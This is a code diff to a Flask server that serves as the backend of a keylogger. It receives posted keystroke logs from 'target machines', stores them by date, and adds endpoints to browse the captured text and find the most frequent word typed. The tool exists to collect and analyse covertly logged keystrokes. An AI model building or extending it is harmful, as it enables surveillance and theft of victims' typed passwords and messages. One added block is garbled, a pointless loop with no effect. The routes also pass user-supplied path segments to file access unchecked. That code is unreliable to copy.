@@ -14,12 +14,10 @@ os.makedirs(DATA_FOLDER, exist_ok=True)
 
 @app.route('/')
 def home():
-
     return render_template('First_page.html')
 
 @app.route('/main')
 def main():
-
     return render_template('Main_page.html')
 
 @app.route('/api/keylogges', methods=['POST'])
@@ -79,18 +77,20 @@ def get_target_machines_list():
         machines.append(machine)
     return json.dumps(machines)
 
+from flask import jsonify
+
 @app.route("/data/<machine>/years")
 def get_years_list(machine):
     global DATA_FOLDER
-    print(machine)
-    years = []
     machine_folder = os.path.join(DATA_FOLDER, machine)
-    if not os.path.exists(machine_folder):
-        return "Machine not found", 404
 
-    for year in os.listdir(machine_folder):
-        years.append(year)
-    return json.dumps(years)
+    if not os.path.exists(machine_folder):
+        # מחזירים JSON ולא מחרוזת
+        return jsonify({"error": "Machine not found"}), 404
+
+    years = [year for year in os.listdir(machine_folder)]
+    return jsonify(years)   # זה מחזיר JSON תקין
+
 
 @app.route("/data/<machine>/<year>/months")
 def get_months_list(machine, year): 
@@ -106,7 +106,7 @@ def get_months_list(machine, year):
 @app.route("/data/<machine>/<year>/<month>/days")
 def get_days_list(machine, year, month):
     days = []
-    month_folder = os.path.join(app.DATA_FOLDER, machine, year, month)
+    month_folder = os.path.join(DATA_FOLDER, machine, year, month)
     if not os.path.exists(month_folder):
         return "Month not found", 404
 
@@ -124,7 +124,12 @@ def get_day_data(machine, year, month, day):
 
     with open(day_file_path, "r", encoding="utf-8") as f:
         content = f.read()
-    return content
+        data = ''  
+    for i in range (len(jsonify(content))):
+        i += 27
+        data
+
+    return jsonify(content)
 
 
 @app.route("/data/<machine>/<year>/<month>/<day>/delete", methods=["DELETE"])
@@ -251,6 +256,46 @@ def collect_data(start, end):
                                 pass
 
     return jsonify(sorted(result, key=lambda x: x["datetime"]))
+
+from collections import Counter
+import re
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+
+@app.route("/most_frequent/<machine>/<year>/<month>/<day>")
+def most_frequent_word(machine, year, month, day):
+    # בונים נתיב לקובץ
+    file_path = os.path.join(DATA_FOLDER, machine, year, month, day)
+
+    if not os.path.exists(file_path):
+        return jsonify({"error": "File not found"}), 404
+
+    words = []
+    try:
+        with open(file_path, encoding="utf-8") as f:
+            for line in f:
+                if line.strip():
+                    try:
+                        # מפרידים את ה־[תאריך]
+                        _, content = line.split("]", 1)
+                    except ValueError:
+                        content = line
+                    # מפרקים למילים (מורידים סימני פיסוק, הכל לאותיות קטנות)
+                    tokens = re.findall(r"\w+", content.lower())
+                    words.extend(tokens)
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+    if not words:
+        return jsonify({"error": "No words found"}), 404
+
+    # מונים תדירות
+    counter = Counter(words)
+    most_common_word, freq = counter.most_common(1)[0]
+
+    return jsonify({
+        "most_frequent_word": most_common_word,
+        "frequency": freq
+    })
 
 if __name__ == '__main__':
     app.run(debug=True)
